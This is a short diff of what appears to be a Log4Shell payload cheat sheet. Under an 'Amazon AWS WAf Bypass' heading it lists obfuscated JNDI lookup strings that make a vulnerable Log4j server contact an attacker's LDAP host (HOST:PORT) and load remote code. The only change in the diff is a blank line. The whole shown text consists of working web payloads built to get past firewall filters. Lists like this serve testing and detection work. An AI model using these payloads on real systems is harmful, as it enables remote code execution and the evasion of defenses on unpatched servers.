@@ -8,6 +8,7 @@ ${jndi${123%25ff:-}:ldap://HOST:PORT/a}
 #### Amazon AWS WAf Bypass
 
 ${j${k8s:k5:-ND}i${sd:k5:-:}ldap://HOST:PORT/a}
+
 ${jnd${123%25ff:-${123%25ff:-i:}}ldap://HOST:PORT/a}
 
 
